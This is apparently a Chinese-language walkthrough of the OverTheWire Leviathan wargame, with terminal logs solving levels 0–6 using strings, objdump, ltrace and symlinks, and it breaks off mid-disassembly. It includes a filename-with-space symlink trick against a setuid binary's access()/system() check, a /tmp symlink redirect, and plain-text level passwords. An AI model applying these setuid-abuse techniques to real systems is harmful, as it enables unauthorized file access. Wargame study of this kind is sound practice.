/opt/gef/ * pwndbg (https://github.com/pwndbg/pwndbg) in /opt/pwndbg/ * peda (https://github.com/longld/peda.git) in /opt/peda/ * gdbinit (https://github.com/gdbinit/Gdbinit) in /opt/gdbinit/ * pwntools (https://github.com/Gallopsled/pwntools) * radare2 (http://www.radare.org/) Both python2 and python3 are installed. --[ More information ]-- For more information regarding individual wargames, visit http://www.overthewire.org/wargames/ For support, questions or comments, contact us on discord or IRC. Enjoy your stay! leviathan0@gibson:~$ level1 \u5148\u770b\u4e00\u773c\u5b58\u5bc6\u7801\u7684\u5730\u65b9 total 48 drwxr-xr-x 2 root root 4096 Apr 23 18:04 ./ drwxr-xr-x 111 root root 12288 Apr 23 18:06 ../ -r-------- 1 leviathan0 leviathan0 11 Apr 23 18:04 leviathan0 -r-------- 1 leviathan1 leviathan1 11 Apr 23 18:04 leviathan1 -r-------- 1 leviathan2 leviathan2 11 Apr 23 18:04 leviathan2 -r-------- 1 leviathan3 leviathan3 11 Apr 23 18:04 leviathan3 -r-------- 1 leviathan4 leviathan4 11 Apr 23 18:04 leviathan4 -r-------- 1 leviathan5 leviathan5 11 Apr 23 18:04 leviathan5 -r-------- 1 leviathan6 leviathan6 11 Apr 23 18:04 leviathan6 -r-------- 1 leviathan7 leviathan7 11 Apr 23 18:04 leviathan7 leviathan0@gibson:~$ \u8fd9\u6311\u6218\u5565\u4e5f\u4e0d\u5199\uff0c\u5168\u9760\u8111\u6d1e\u554a\u3002\u3002\u3002 leviathan0@gibson:~$ ll total 24 drwxr-xr-x 3 root root 4096 Apr 23 18:04 ./ drwxr-xr-x 83 root root 4096 Apr 23 18:06 ../ drwxr-x--- 2 leviathan1 leviathan0 4096 Apr 23 18:04 .backup/ -rw-r--r-- 1 root root 220 Jan 6 2022 .bash_logout -rw-r--r-- 1 root root 3771 Jan 6 2022 .bashrc -rw-r--r-- 1 root root 807 Jan 6 2022 .profile leviathan0@gibson:~$ ll .backup total 140 drwxr-x--- 2 leviathan1 leviathan0 4096 Apr 23 18:04 ./ drwxr-xr-x 3 root root 4096 Apr 23 18:04 ../ -rw-r----- 1 leviathan1 leviathan0 133259 Apr 23 18:04 bookmarks.html leviathan0@gibson:~$ cat .backup/bookmarks.html | grep \"pass\" <DT><A HREF=\"http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is PPIfmI1qsA\" ADD_DATE=\"1155384634\" LAST_CHARSET=\"ISO-8859-1\" ID=\"rdf:#$2wIU71\">password to leviathan1</A> leviathan0@gibson:~$ \u53cd\u6b63\u8fdb\u53bb\u4ee5\u540e\u770b\u4e86\u770bhome\uff0c\u627e\u5230\u4e86 level2 \u5148\u770b\u4e00\u4e0b\u6587\u4ef6 leviathan1@gibson:~$ file check check: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=aab009a1eb3940df51c668d1c35dc9cdc1191805, for GNU/Linux 3.2.0, not stripped \u8bf4\u660e\u5982\u4e0b\uff1a - setuid \uff1a\u8868\u793a\u8be5\u53ef\u6267\u884c\u6587\u4ef6\u88ab\u8bbe\u7f6e\u4e86 SetUID \u5c5e\u6027\uff0c\u5373\u5728\u6267\u884c\u8be5\u6587\u4ef6\u65f6\uff0c\u4f1a\u4f7f\u7528\u8be5\u6587\u4ef6\u7684\u6240\u6709\u8005\u7684\u6743\u9650\u6765\u6267\u884c\uff0c\u800c\u4e0d\u662f\u5f53\u524d\u7528\u6237\u7684\u6743\u9650\u3002 - ELF \uff1a\u8868\u793a\u8be5\u53ef\u6267\u884c\u6587\u4ef6\u4f7f\u7528 ELF \u6587\u4ef6\u683c\u5f0f\u3002 - 32-bit \uff1a\u8868\u793a\u8be5\u53ef\u6267\u884c\u6587\u4ef6\u662f 32 \u4f4d\u7684\u3002 - LSB \uff1a\u8868\u793a\u8be5\u53ef\u6267\u884c\u6587\u4ef6\u9075\u5faa LSB\uff08Linux Standard Base\uff09\u89c4\u8303\u3002 - Intel 80386 \uff1a\u8868\u793a\u8be5\u53ef\u6267\u884c\u6587\u4ef6\u662f\u4e3a Intel 80386 \u67b6\u6784\u7f16\u8bd1\u7684\u3002 - version 1 (SYSV) \uff1a\u8868\u793a\u8be5\u53ef\u6267\u884c\u6587\u4ef6\u4f7f\u7528 SYSV \u7248\u672c 1 ABI \u6807\u51c6\u3002 - dynamically linked \uff1a\u8868\u793a\u8be5\u53ef\u6267\u884c\u6587\u4ef6\u4f7f\u7528\u52a8\u6001\u94fe\u63a5\u5e93\u3002 - interpreter /lib/ld-linux.so.2 \uff1a\u8868\u793a\u8be5\u53ef\u6267\u884c\u6587\u4ef6\u4f7f\u7528 /lib/ld-linux.so.2 \u4f5c\u4e3a\u52a8\u6001\u94fe\u63a5\u5e93\u7684\u89e3\u91ca\u5668\u3002 - BuildID[sha1]=aab009a1eb3940df51c668d1c35dc9cdc1191805 \uff1a\u8868\u793a\u8be5\u53ef\u6267\u884c\u6587\u4ef6\u7684\u6784\u5efa ID\u3002 - for GNU/Linux 3.2.0 \uff1a\u8868\u793a\u8be5\u53ef\u6267\u884c\u6587\u4ef6\u662f\u4e3a GNU/Linux 3.2.0 \u7248\u672c\u7f16\u8bd1\u7684\u3002 - not stripped \uff1a\u8868\u793a\u8be5\u53ef\u6267\u884c\u6587\u4ef6\u6ca1\u6709\u88ab\u5265\u79bb\uff08stripped\uff09\uff0c\u5373\u53ef\u6267\u884c\u6587\u4ef6\u4e2d\u5305\u542b\u4e86\u7b26\u53f7\u8868\u548c\u8c03\u8bd5\u4fe1\u606f\uff0c\u4fbf\u4e8e\u8c03\u8bd5\u548c\u5206\u6790\u3002 \u4e00\u5f00\u59cb\u6ca1\u601d\u8def\uff0c\u8f93\u4e86\u597d\u51e0\u904d\u5bc6\u7801\u90fd\u9519\uff0c\u7136\u540e\u7528strings\u626b\u4e86\u4e00\u4e0b leviathan1@gibson:~$ strings check td8 /lib/ld-linux.so.2 _IO_stdin_used __libc_start_main __stack_chk_fail puts printf getchar system strcmp geteuid setreuid libc.so.6 GLIBC_2.4 GLIBC_2.34 GLIBC_2.0 __gmon_start__ secrf love password: /bin/sh Wrong password, Good Bye ... \u641e\u4e86\u4e00\u4e0b\u5b83\u7684\u6c47\u7f16 leviathan1@gibson:~$ objdump -d check check: file format elf32-i386 Disassembly of section .init: 08049000 <_init>: 8049000: f3 0f 1e fb endbr32 8049004: 53 push %ebx 8049005: 83 ec 08 sub $0x8,%esp 8049008: e8 13 01 00 00 call 8049120 <__x86.get_pc_thunk.bx> 804900d: 81 c3 f3 2f 00 00 add $0x2ff3,%ebx 8049013: 8b 83 fc ff ff ff mov -0x4(%ebx),%eax 8049019: 85 c0 test %eax,%eax 804901b: 74 02 je 804901f <_init+0x1f> 804901d: ff d0 call *%eax 804901f: 83 c4 08 add $0x8,%esp 8049022: 5b pop %ebx 8049023: c3 ret Disassembly of section .plt: 08049030 <strcmp@plt-0x10>: 8049030: ff 35 04 c0 04 08 push 0x804c004 8049036: ff 25 08 c0 04 08 jmp *0x804c008 804903c: 00 00 add %al,(%eax) ... 08049040 <strcmp@plt>: 8049040: ff 25 0c c0 04 08 jmp *0x804c00c 8049046: 68 00 00 00 00 push $0x0 804904b: e9 e0 ff ff ff jmp 8049030 <_init+0x30> 08049050 <__libc_start_main@plt>: 8049050: ff 25 10 c0 04 08 jmp *0x804c010 8049056: 68 08 00 00 00 push $0x8 804905b: e9 d0 ff ff ff jmp 8049030 <_init+0x30> 08049060 <printf@plt>: 8049060: ff 25 14 c0 04 08 jmp *0x804c014 8049066: 68 10 00 00 00 push $0x10 804906b: e9 c0 ff ff ff jmp 8049030 <_init+0x30> 08049070 <getchar@plt>: 8049070: ff 25 18 c0 04 08 jmp *0x804c018 8049076: 68 18 00 00 00 push $0x18 804907b: e9 b0 ff ff ff jmp 8049030 <_init+0x30> 08049080 <__stack_chk_fail@plt>: 8049080: ff 25 1c c0 04 08 jmp *0x804c01c 8049086: 68 20 00 00 00 push $0x20 804908b: e9 a0 ff ff ff jmp 8049030 <_init+0x30> 08049090 <geteuid@plt>: 8049090: ff 25 20 c0 04 08 jmp *0x804c020 8049096: 68 28 00 00 00 push $0x28 804909b: e9 90 ff ff ff jmp 8049030 <_init+0x30> 080490a0 <puts@plt>: 80490a0: ff 25 24 c0 04 08 jmp *0x804c024 80490a6: 68 30 00 00 00 push $0x30 80490ab: e9 80 ff ff ff jmp 8049030 <_init+0x30> 080490b0 <system@plt>: 80490b0: ff 25 28 c0 04 08 jmp *0x804c028 80490b6: 68 38 00 00 00 push $0x38 80490bb: e9 70 ff ff ff jmp 8049030 <_init+0x30> 080490c0 <setreuid@plt>: 80490c0: ff 25 2c c0 04 08 jmp *0x804c02c 80490c6: 68 40 00 00 00 push $0x40 80490cb: e9 60 ff ff ff jmp 8049030 <_init+0x30> Disassembly of section .text: 080490d0 <_start>: 80490d0: f3 0f 1e fb endbr32 80490d4: 31 ed xor %ebp,%ebp 80490d6: 5e pop %esi 80490d7: 89 e1 mov %esp,%ecx 80490d9: 83 e4 f0 and $0xfffffff0,%esp 80490dc: 50 push %eax 80490dd: 54 push %esp 80490de: 52 push %edx 80490df: e8 19 00 00 00 call 80490fd <_start+0x2d> 80490e4: 81 c3 1c 2f 00 00 add $0x2f1c,%ebx 80490ea: 6a 00 push $0x0 80490ec: 6a 00 push $0x0 80490ee: 51 push %ecx 80490ef: 56 push %esi 80490f0: c7 c0 e6 91 04 08 mov $0x80491e6,%eax 80490f6: 50 push %eax 80490f7: e8 54 ff ff ff call 8049050 <__libc_start_main@plt> 80490fc: f4 hlt 80490fd: 8b 1c 24 mov (%esp),%ebx 8049100: c3 ret 8049101: 66 90 xchg %ax,%ax 8049103: 66 90 xchg %ax,%ax 8049105: 66 90 xchg %ax,%ax 8049107: 66 90 xchg %ax,%ax 8049109: 66 90 xchg %ax,%ax 804910b: 66 90 xchg %ax,%ax 804910d: 66 90 xchg %ax,%ax 804910f: 90 nop 08049110 <_dl_relocate_static_pie>: 8049110: f3 0f 1e fb endbr32 8049114: c3 ret 8049115: 66 90 xchg %ax,%ax 8049117: 66 90 xchg %ax,%ax 8049119: 66 90 xchg %ax,%ax 804911b: 66 90 xchg %ax,%ax 804911d: 66 90 xchg %ax,%ax 804911f: 90 nop 08049120 <__x86.get_pc_thunk.bx>: 8049120: 8b 1c 24 mov (%esp),%ebx 8049123: c3 ret 8049124: 66 90 xchg %ax,%ax 8049126: 66 90 xchg %ax,%ax 8049128: 66 90 xchg %ax,%ax 804912a: 66 90 xchg %ax,%ax 804912c: 66 90 xchg %ax,%ax 804912e: 66 90 xchg %ax,%ax 08049130 <deregister_tm_clones>: 8049130: b8 38 c0 04 08 mov $0x804c038,%eax 8049135: 3d 38 c0 04 08 cmp $0x804c038,%eax 804913a: 74 24 je 8049160 <deregister_tm_clones+0x30> 804913c: b8 00 00 00 00 mov $0x0,%eax 8049141: 85 c0 test %eax,%eax 8049143: 74 1b je 8049160 <deregister_tm_clones+0x30> 8049145: 55 push %ebp 8049146: 89 e5 mov %esp,%ebp 8049148: 83 ec 14 sub $0x14,%esp 804914b: 68 38 c0 04 08 push $0x804c038 8049150: ff d0 call *%eax 8049152: 83 c4 10 add $0x10,%esp 8049155: c9 leave 8049156: c3 ret 8049157: 8d b4 26 00 00 00 00 lea 0x0(%esi,%eiz,1),%esi 804915e: 66 90 xchg %ax,%ax 8049160: c3 ret 8049161: 8d b4 26 00 00 00 00 lea 0x0(%esi,%eiz,1),%esi 8049168: 8d b4 26 00 00 00 00 lea 0x0(%esi,%eiz,1),%esi 804916f: 90 nop 08049170 <register_tm_clones>: 8049170: b8 38 c0 04 08 mov $0x804c038,%eax 8049175: 2d 38 c0 04 08 sub $0x804c038,%eax 804917a: 89 c2 mov %eax,%edx 804917c: c1 e8 1f shr $0x1f,%eax 804917f: c1 fa 02 sar $0x2,%edx 8049182: 01 d0 add %edx,%eax 8049184: d1 f8 sar %eax 8049186: 74 20 je 80491a8 <register_tm_clones+0x38> 8049188: ba 00 00 00 00 mov $0x0,%edx 804918d: 85 d2 test %edx,%edx 804918f: 74 17 je 80491a8 <register_tm_clones+0x38> 8049191: 55 push %ebp 8049192: 89 e5 mov %esp,%ebp 8049194: 83 ec 10 sub $0x10,%esp 8049197: 50 push %eax 8049198: 68 38 c0 04 08 push $0x804c038 804919d: ff d2 call *%edx 804919f: 83 c4 10 add $0x10,%esp 80491a2: c9 leave 80491a3: c3 ret 80491a4: 8d 74 26 00 lea 0x0(%esi,%eiz,1),%esi 80491a8: c3 ret 80491a9: 8d b4 26 00 00 00 00 lea 0x0(%esi,%eiz,1),%esi 080491b0 <__do_global_dtors_aux>: 80491b0: f3 0f 1e fb endbr32 80491b4: 80 3d 38 c0 04 08 00 cmpb $0x0,0x804c038 80491bb: 75 1b jne 80491d8 <__do_global_dtors_aux+0x28> 80491bd: 55 push %ebp 80491be: 89 e5 mov %esp,%ebp 80491c0: 83 ec 08 sub $0x8,%esp 80491c3: e8 68 ff ff ff call 8049130 <deregister_tm_clones> 80491c8: c6 05 38 c0 04 08 01 movb $0x1,0x804c038 80491cf: c9 leave 80491d0: c3 ret 80491d1: 8d b4 26 00 00 00 00 lea 0x0(%esi,%eiz,1),%esi 80491d8: c3 ret 80491d9: 8d b4 26 00 00 00 00 lea 0x0(%esi,%eiz,1),%esi 080491e0 <frame_dummy>: 80491e0: f3 0f 1e fb endbr32 80491e4: eb 8a jmp 8049170 <register_tm_clones> 080491e6 <main>: 80491e6: 8d 4c 24 04 lea 0x4(%esp),%ecx 80491ea: 83 e4 f0 and $0xfffffff0,%esp 80491ed: ff 71 fc push -0x4(%ecx) 80491f0: 55 push %ebp 80491f1: 89 e5 mov %esp,%ebp 80491f3: 53 push %ebx 80491f4: 51 push %ecx 80491f5: 83 ec 20 sub $0x20,%esp 80491f8: 65 a1 14 00 00 00 mov %gs:0x14,%eax 80491fe: 89 45 f4 mov %eax,-0xc(%ebp) 8049201: 31 c0 xor %eax,%eax 8049203: c7 45 e0 73 65 78 00 movl $0x786573,-0x20(%ebp) 804920a: c7 45 ed 73 65 63 72 movl $0x72636573,-0x13(%ebp) 8049211: 66 c7 45 f1 65 74 movw $0x7465,-0xf(%ebp) 8049217: c6 45 f3 00 movb $0x0,-0xd(%ebp) 804921b: c7 45 e4 67 6f 64 00 movl $0x646f67,-0x1c(%ebp) 8049222: c7 45 e8 6c 6f 76 65 movl $0x65766f6c,-0x18(%ebp) 8049229: c6 45 ec 00 movb $0x0,-0x14(%ebp) 804922d: 83 ec 0c sub $0xc,%esp 8049230: 68 08 a0 04 08 push $0x804a008 8049235: e8 26 fe ff ff call 8049060 <printf@plt> 804923a: 83 c4 10 add $0x10,%esp 804923d: e8 2e fe ff ff call 8049070 <getchar@plt> 8049242: 88 45 dc mov %al,-0x24(%ebp) 8049245: e8 26 fe ff ff call 8049070 <getchar@plt> 804924a: 88 45 dd mov %al,-0x23(%ebp) 804924d: e8 1e fe ff ff call 8049070 <getchar@plt> 8049252: 88 45 de mov %al,-0x22(%ebp) 8049255: c6 45 df 00 movb $0x0,-0x21(%ebp) 8049259: 83 ec 08 sub $0x8,%esp 804925c: 8d 45 e0 lea -0x20(%ebp),%eax 804925f: 50 push %eax 8049260: 8d 45 dc lea -0x24(%ebp),%eax 8049263: 50 push %eax 8049264: e8 d7 fd ff ff call 8049040 <strcmp@plt> 8049269: 83 c4 10 add $0x10,%esp 804926c: 85 c0 test %eax,%eax 804926e: 75 2b jne 804929b <main+0xb5> 8049270: e8 1b fe ff ff call 8049090 <geteuid@plt> 8049275: 89 c3 mov %eax,%ebx 8049277: e8 14 fe ff ff call 8049090 <geteuid@plt> 804927c: 83 ec 08 sub $0x8,%esp 804927f: 53 push %ebx 8049280: 50 push %eax 8049281: e8 3a fe ff ff call 80490c0 <setreuid@plt> 8049286: 83 c4 10 add $0x10,%esp 8049289: 83 ec 0c sub $0xc,%esp 804928c: 68 13 a0 04 08 push $0x804a013 8049291: e8 1a fe ff ff call 80490b0 <system@plt> 8049296: 83 c4 10 add $0x10,%esp 8049299: eb 10 jmp 80492ab <main+0xc5> 804929b: 83 ec 0c sub $0xc,%esp 804929e: 68 1b a0 04 08 push $0x804a01b 80492a3: e8 f8 fd ff ff call 80490a0 <puts@plt> 80492a8: 83 c4 10 add $0x10,%esp 80492ab: b8 00 00 00 00 mov $0x0,%eax 80492b0: 8b 55 f4 mov -0xc(%ebp),%edx 80492b3: 65 2b 15 14 00 00 00 sub %gs:0x14,%edx 80492ba: 74 05 je 80492c1 <main+0xdb> 80492bc: e8 bf fd ff ff call 8049080 <__stack_chk_fail@plt> 80492c1: 8d 65 f8 lea -0x8(%ebp),%esp 80492c4: 59 pop %ecx 80492c5: 5b pop %ebx 80492c6: 5d pop %ebp 80492c7: 8d 61 fc lea -0x4(%ecx),%esp 80492ca: c3 ret Disassembly of section .fini: 080492cc <_fini>: 80492cc: f3 0f 1e fb endbr32 80492d0: 53 push %ebx 80492d1: 83 ec 08 sub $0x8,%esp 80492d4: e8 47 fe ff ff call 8049120 <__x86.get_pc_thunk.bx> 80492d9: 81 c3 27 2d 00 00 add $0x2d27,%ebx 80492df: 83 c4 08 add $0x8,%esp 80492e2: 5b pop %ebx 80492e3: c3 ret leviathan1@gibson:~$ \u5176\u4e2d\u7684 movl $0x786573,-0x20(%ebp) \u770b\u51fa\u6765\u5bc6\u7801\u662fsex \u8bf4\u597d\u7684\u53ea\u9700\u8981\u57fa\u672c\u7684linux\u547d\u4ee4\u5462\uff1f\uff1f\uff1f\u592a\u62bd\u8c61\u4e86 leviathan1@gibson:~$ ./check password: sex $ cat /etc/leviathan_pass/leviathan2 mEh5PNl10e $ \u4ed6\u4eba\u89e3\u6cd5 \u5f88\u597d\uff0c\u7136\u540e\u53bb\u7f51\u4e0a\u770b\u4e86\u4e00\u4e0b\u522b\u4eba\u7684\u7b54\u6848\uff0c\u8c8c\u4f3c\u6709\u53e6\u4e00\u4e2a\u597d\u4e1c\u897f\u53eb ltrace \u8fd9\u4e2a\u73a9\u610f\u513f\u53ef\u4ee5\u5355\u6b65\u8c03\u8bd5\uff0c\u7136\u540e\u5c31\u5f88\u7b80\u5355\u4e86 leviathan1@gibson:~$ ltrace ./check __libc_start_main(0x80491e6, 1, 0xffffd504, 0 <unfinished ...> printf(\"password: \") = 10 getchar(0xf7fbe4a0, 0xf7fd6f80, 0x786573, 0x646f67password: 123 ) = 49 getchar(0xf7fbe4a0, 0xf7fd6f31, 0x786573, 0x646f67) = 50 getchar(0xf7fbe4a0, 0xf7fd3231, 0x786573, 0x646f67) = 51 strcmp(\"123\", \"sex\") = -1 puts(\"Wrong password, Good Bye ...\"Wrong password, Good Bye ... ) = 29 +++ exited (status 0) +++ leviathan1@gibson:~$ \u8fd9\u91cc\u6709\u4e00\u4e2a\u4e2d\u6587\u7684 \u6559\u7a0b level3 \u76f4\u63a5\u8fd0\u884c\u4f1a\u63d0\u793a\u4e0d\u6210\u529f leviathan2@gibson:~$ ll total 36 drwxr-xr-x 2 root root 4096 Apr 23 18:04 ./ drwxr-xr-x 83 root root 4096 Apr 23 18:06 ../ -rw-r--r-- 1 root root 220 Jan 6 2022 .bash_logout -rw-r--r-- 1 root root 3771 Jan 6 2022 .bashrc -r-sr-x--- 1 leviathan3 leviathan2 15060 Apr 23 18:04 printfile* -rw-r--r-- 1 root root 807 Jan 6 2022 .profile leviathan2@gibson:~$ file printfile printfile: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=32c7e041842883e05808ab99c763a0fc1849b84e, for GNU/Linux 3.2.0, not stripped leviathan2@gibson:~$ printfile printfile: command not found leviathan2@gibson:~$ printfile --help printfile: command not found leviathan2@gibson:~$ ./printfile *** File Printer *** Usage: ./printfile filename leviathan2@gibson:~$ ./printfile /etc/leviathan_pass/leviathan3 You cant have that file... \u7136\u540e\u5206\u522b\u770b\u4e00\u4e0b leviathan2@gibson:~$ ./printfile /etc/leviathan_pass/leviathan2 /bin/cat: /etc/leviathan_pass/leviathan2: Permission denied leviathan2@gibson:~$ ltrace ./printfile /etc/leviathan_pass/leviathan3 __libc_start_main(0x80491e6, 2, 0xffffd4d4, 0 <unfinished ...> access(\"/etc/leviathan_pass/leviathan3\", 4) = -1 puts(\"You cant have that file...\"You cant have that file... ) = 27 +++ exited (status 1) +++ leviathan2@gibson:~$ ltrace ./printfile /etc/leviathan_pass/leviathan3 __libc_start_main(0x80491e6, 2, 0xffffd4d4, 0 <unfinished ...> access(\"/etc/leviathan_pass/leviathan3\", 4) = -1 puts(\"You cant have that file...\"You cant have that file... ) = 27 +++ exited (status 1) +++ leviathan2@gibson:~$ ltrace ./printfile .bashrc __libc_start_main(0x80491e6, 2, 0xffffd4e4, 0 <unfinished ...> access(\".bashrc\", 4) = 0 snprintf(\"/bin/cat .bashrc\", 511, \"/bin/cat %s\", \".bashrc\") = 16 geteuid() = 12002 geteuid() = 12002 setreuid(12002, 12002) = 0 system(\"/bin/cat .bashrc\"# ~/.bashrc: executed by bash(1) for non-login shells. \u8fd9\u91cc\u7684\u903b\u8f91\u662f\uff0caccess\u51fd\u6570\u6765\u5224\u65ad\u4f60\u662f\u5426\u6709\u67d0\u4e2a\u6587\u4ef6\u7684\u6743\u9650\uff0c\u7136\u540e\u8c03\u7528cat\u8fdb\u884c\u8f93\u51fa\u3002\u56e0\u6b64\u53ef\u884c\u7684\u89e3\u91ca\u5c31\u662f\u4f7f\u7528\u6709\u7a7a\u683c\u7684\u6587\u4ef6\u540d\uff0c\u505a\u4e00\u4e2a\u8f6f\u8fde\u63a5\uff0c\u8fd9\u6837cat\u53ea\u4f1a\u8bfb\u53d6\u7b2c\u4e00\u4e2a\uff0c\u5c31\u7ed3\u675f\u4e86\u3002 leviathan2@gibson:~$ cd /tmp/ leviathan2@gibson:/tmp$ ls ls: cannot open directory '.': Permission denied leviathan2@gibson:/tmp$ mkdir hnz leviathan2@gibson:/tmp$ cd hnz leviathan2@gibson:/tmp/hnz$ ls leviathan2@gibson:/tmp/hnz$ ll total 732 drwxrwxr-x 2 leviathan2 leviathan2 4096 Jul 19 06:59 ./ drwxrwx-wt 16075 root root 741376 Jul 19 06:59 ../ leviathan2@gibson:/tmp/hnz$ touch \"file1 file2.txt\" leviathan2@gibson:/tmp/hnz$ ls file1 file2.txt leviathan2@gibson:/tmp/hnz$ ln -s /etc/leviathan_pass/leviathan3 /tmp/hnz/file1 leviathan2@gibson:/tmp/hnz$ ll total 732 drwxrwxr-x 2 leviathan2 leviathan2 4096 Jul 19 07:02 ./ drwxrwx-wt 16075 root root 741376 Jul 19 07:02 ../ lrwxrwxrwx 1 leviathan2 leviathan2 30 Jul 19 07:02 file1 -> /etc/leviathan_pass/leviathan3 -rw-rw-r-- 1 leviathan2 leviathan2 0 Jul 19 07:00 file1 file2.txt leviathan2@gibson:~$ ./printfile /tmp/hnz/\"file1 file2.txt\" Q0G8j4sakn /bin/cat: file2.txt: No such file or directory leviathan2@gibson:~$ level4 \u8fd8\u662f\u5148\u770b\u4e00\u4e0b leviathan3@gibson:~$ ./level3 Enter the password> 123 bzzzzzzzzap. WRONG leviathan3@gibson:~$ ltrace ./level3 __libc_start_main(0x80492bf, 1, 0xffffd504, 0 <unfinished ...> strcmp(\"h0no33\", \"kakaka\") = -1 printf(\"Enter the password> \") = 20 fgets(Enter the password> 1234 \"1234\\n\", 256, 0xf7e2a620) = 0xffffd2dc strcmp(\"1234\\n\", \"snlprintf\\n\") = -1 puts(\"bzzzzzzzzap. WRONG\"bzzzzzzzzap. WRONG ) = 19 +++ exited (status 0) +++ \u7136\u540e\u5c31\u662f\u76f4\u63a5\u8bfb\u53d6\u4e86\uff0c\u8fd9\u73a9\u610f\u513f\u5c31\u662f\u4e00\u63d0\u6743 leviathan3@gibson:~$ ./level3 Enter the password> snlprintf [You've got shell]! $ cat /etc/leviathan_pass/leviathan4 AgvropI4OA $ level5 \u753b\u98ce\u8d8a\u6765\u8d8a\u6b63\u5e38\u4e86 leviathan4@gibson:~/.trash$ ./bin 01000101 01001011 01001011 01101100 01010100 01000110 00110001 01011000 01110001 01110011 00001010 \u663e\u7136\u7684ascii\u7f16\u7801 echo \"01000101 01001011 01001011 01101100 01010100 01000110 00110001 01011000 01110001 01110011 00001010\" | perl -lape '$_=pack\"(B8)*\",@F' EKKlTF1Xqs level6 \u8c8c\u4f3c\u76f4\u63a5\u8f93\u51fa\u4e86level5\u7684\u5bc6\u7801 leviathan5@gibson:~$ ./leviathan5 EKKlTF1Xqs \u770b\u8d77\u6765\u6709\u4e2a\u53eblog\u7684\u5f88\u6709\u7528 leviathan5@gibson:~$ ltrace ./leviathan5 __libc_start_main(0x8049206, 1, 0xffffd534, 0 <unfinished ...> fopen(\"/tmp/file.log\", \"r\") = 0 puts(\"Cannot find /tmp/file.log\"Cannot find /tmp/file.log ) = 26 exit(-1 <no return ...> +++ exited (status 255) +++ leviathan5@gibson:~$ ltrace ./leviathan5 __libc_start_main(0x8049206, 1, 0xffffd534, 0 <unfinished ...> fopen(\"/tmp/file.log\", \"r\") = 0x804d1a0 fgetc(0x804d1a0) = 'E' feof(0x804d1a0) = 0 putchar(69, 0x804a008, 0xf7c184be, 0xf7fbe4a0) = 69 fgetc(0x804d1a0) = 'K' feof(0x804d1a0) = 0 putchar(75, 0x804a008, 0xf7c184be, 0xf7fbe4a0) = 75 fgetc(0x804d1a0) = 'K' feof(0x804d1a0) = 0 putchar(75, 0x804a008, 0xf7c184be, 0xf7fbe4a0) = 75 fgetc(0x804d1a0) = 'l' feof(0x804d1a0) = 0 putchar(108, 0x804a008, 0xf7c184be, 0xf7fbe4a0) = 108 fgetc(0x804d1a0) = 'T' feof(0x804d1a0) = 0 putchar(84, 0x804a008, 0xf7c184be, 0xf7fbe4a0) = 84 fgetc(0x804d1a0) = 'F' feof(0x804d1a0) = 0 putchar(70, 0x804a008, 0xf7c184be, 0xf7fbe4a0) = 70 fgetc(0x804d1a0) = '1' feof(0x804d1a0) = 0 putchar(49, 0x804a008, 0xf7c184be, 0xf7fbe4a0) = 49 fgetc(0x804d1a0) = 'X' feof(0x804d1a0) = 0 putchar(88, 0x804a008, 0xf7c184be, 0xf7fbe4a0) = 88 fgetc(0x804d1a0) = 'q' feof(0x804d1a0) = 0 putchar(113, 0x804a008, 0xf7c184be, 0xf7fbe4a0) = 113 fgetc(0x804d1a0) = 's' feof(0x804d1a0) = 0 putchar(115, 0x804a008, 0xf7c184be, 0xf7fbe4a0) = 115 fgetc(0x804d1a0) = '\\n' feof(0x804d1a0) = 0 putchar(10, 0x804a008, 0xf7c184be, 0xf7fbe4a0EKKlTF1Xqs ) = 10 fgetc(0x804d1a0) = '\\377' feof(0x804d1a0) = 1 fclose(0x804d1a0) = 0 getuid() = 12005 setuid(12005) = 0 unlink(\"/tmp/file.log\") = 0 +++ exited (status 0) +++ leviathan5@gibson:~$ \u90a3\u8fd8\u662f\u8f6f\u8fde\u63a5\u5c31\u89e3\u51b3\u4e86 leviathan5@gibson:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log leviathan5@gibson:~$ ./leviathan5 YZ55XPVk2l leviathan5@gibson:~$ level7 leviathan6@gibson:~$ ./leviathan6 usage: ./leviathan6 <4 digit code> leviathan6@gibson:~$ ltrace ./leviathan6 __libc_start_main(0x80491d6, 1, 0xffffd504, 0 <unfinished ...> printf(\"usage: %s <4 digit code>\\n\", \"./leviathan6\"usage: ./leviathan6 <4 digit code> ) = 35 exit(-1 <no return ...> +++ exited (status 255) +++ leviathan6@gibson:~$ ltrace ./leviathan6 1234 __libc_start_main(0x80491d6, 2, 0xffffd4e4, 0 <unfinished ...> atoi(0xffffd668, 0xf7fd6f80, 0xf7c184be, 0xf7fbe4a0) = 1234 puts(\"Wrong\"Wrong ) = 6 +++ exited (status 0) +++ \u5f88\u597d\uff0c\u53c8\u8981\u770b\u6c47\u7f16\u4e86 leviathan6@gibson:~$ objdump -d leviathan6 leviathan6: file format elf32-i386 Disassembly of section .init: 08049000 <_init>: 8049000: f3 0f 1e fb endbr32 8049004: 53 push %ebx 8049005: 83 ec 08 sub $0x8,%esp 8049008: e8 03 01 00 00 call 8049110 <__x86.get_pc_thunk.bx> 804900d: 81 c3 f3 2f 00 00 add $0x2ff3,%ebx 8049013: 8b 83 fc ff ff ff mov -0x4(%ebx),%eax 8049019: 85 c0 test %eax,%eax 804901b: 74 02 je 804901f <_init+0x1f> 804901d: ff d0 call *%eax 804901f: 83 c4 08 add $0x8,%esp 8049022: 5b pop %ebx 8049023: c3 ret Disassembly of section .plt: 08049030 <__libc_start_main@plt-0x10>: 8049030: ff 35 04 c0 04 08 push 0x804c004 8049036: ff 25 08 c0 04 08 jmp *0x804c008 804903c: 00 00 add %al,(%eax) ... 08049040 <__libc_start_main@plt>: 8049040: ff 25 0c c0 04 08 jmp *0x804c00c 8049046: 68 00 00 00 00 push $0x0 804904b: e9 e0 ff ff ff jmp 8049030 <_init+0x30> 08049050 <printf@plt>: 8049050: ff 25 10 c0 04 08 jmp *0x804c010 8049056: 68 08 00 00 00 push $0x8 804905b: e9 d0 ff ff ff jmp 8049030 <_init+0x30> 08049060 <geteuid@plt>: 8049060: ff 25 14 c0 04 08 jmp *0x804c014 8049066: 68 10 00 00 00 push $0x10 804906b: e9 c0 ff ff ff jmp 8049030 <_init+0x30> 08049070 <puts@plt>: 8049070: ff 25 18 c0 04 08 jmp *0x804c018 8049076: 68 18 00 00 00 push $0x18 804907b: e9 b0 ff ff ff jmp 8049030 <_init+0x30> 08049080 <system@plt>: 8049080: ff 25 